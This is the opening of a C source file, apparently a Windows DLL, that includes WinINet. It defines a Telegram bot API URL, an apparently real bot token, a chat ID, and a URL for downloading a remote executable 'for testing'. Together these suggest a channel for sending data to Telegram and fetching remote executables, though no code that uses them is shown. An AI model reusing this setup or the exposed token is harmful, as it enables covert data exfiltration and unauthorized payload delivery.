#include "pch.h"

#include <Windows.h>
#include <intrin.h>
#include <stdio.h>
#include <string.h>
#include <WinINet.h> // For WinINet functions
#pragma comment(lib, "Wininet.lib")

// Constants for Telegram API
#define TELEGRAM_API_URL "https://api.telegram.org/bot"
#define TELEGRAM_BOT_TOKEN "6932991030:AAF2mD4ATfXLd2QIstFn4ln2DV6lOJazwcM"
#define TELEGRAM_CHAT_ID "1542585085"

// Connstants for Downloading remote exe files
#define DOWNLOAD_REMOTE_EXE "https://api.zile42o.dev/download/sa-mp-0.3.7-R5-1-install.exe" // for testing propose